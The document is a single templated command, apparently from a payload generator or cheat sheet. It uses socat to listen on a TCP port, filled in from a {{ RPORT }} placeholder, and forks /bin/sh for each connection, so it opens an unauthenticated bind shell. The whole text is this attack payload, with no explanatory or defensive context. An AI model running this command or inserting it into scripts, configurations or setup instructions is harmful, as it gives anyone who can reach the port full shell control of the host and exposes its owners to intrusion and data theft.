socat tcp-listen:{{ RPORT }},reuseaddr,fork exec:/bin/sh
